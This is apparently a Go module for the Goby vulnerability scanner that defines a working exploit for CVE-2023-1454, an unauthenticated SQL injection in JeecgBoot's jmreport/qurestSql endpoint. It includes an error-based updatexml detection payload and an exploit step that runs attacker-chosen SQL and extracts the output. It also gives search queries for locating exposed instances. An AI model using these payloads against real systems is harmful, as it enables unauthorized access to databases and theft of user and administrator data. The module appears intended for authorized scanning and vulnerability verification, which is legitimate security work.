package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "jeecg-boot unauthorized SQL Injection Vulnerability (CVE-2023-1454)",
    "Description": "<p>JeecgBoot is a low -code development platform based on code generator.</p><p>Java Low Code Platform for Enterprise web applications jeecg-boot(v3.5.0) latest unauthorized sql injection.</p>",
    "Product": "JeecgBoot-企业级低代码平台",
    "Homepage": "https://github.com/jeecgboot/jeecg-boot",
    "DisclosureDate": "2023-03-17",
    "Author": "sunying",
    "FofaQuery": "title==\"JeecgBoot 企业级低代码平台\"",
    "GobyQuery": "title==\"JeecgBoot 企业级低代码平台\"",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://github.com/jeecgboot/jeecg-boot\">https://github.com/jeecgboot/jeecg-boot</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/J0hnWalker/jeecg-boot-sqli"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "createSelect",
            "value": "user(),database(),@@version",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/jeecg-boot/jmreport/qurestSql",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"apiSelectId\":\"1290104038414721025\",\n\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e10adc3949ba59abbe56e057f20f883e",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/jeecg-boot/jmreport/qurestSql",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"apiSelectId\":\"1290104038414721025\",\n\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select {{{sql}}})),1)) or '%%' like '\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|XPATH syntax error:\\s*'(.+?)'"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2023-1454"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "jeecg-boot 未授权SQL注入漏洞（CVE-2023-1454）",
            "Product": "JeecgBoot-企业级低代码平台",
            "Description": "<p>JeecgBoot是一款基于代码生成器的低代码开发平台。</p><p>企业Web应用程序的Java低代码平台JEECG-Boot（v3.5.0）最新未经授权的SQL注入。<br><br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://github.com/jeecgboot/jeecg-boot\">https://github.com/jeecgboot/jeecg-boot</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。\t<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "jeecg-boot unauthorized SQL Injection Vulnerability (CVE-2023-1454)",
            "Product": "JeecgBoot-企业级低代码平台",
            "Description": "<p>JeecgBoot is a low -code development platform based on code generator.<br></p><p>Java Low Code Platform for Enterprise web applications jeecg-boot(v3.5.0) latest unauthorized sql injection.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://github.com/jeecgboot/jeecg-boot\">https://github.com/jeecgboot/jeecg-boot</a><br></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7373"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}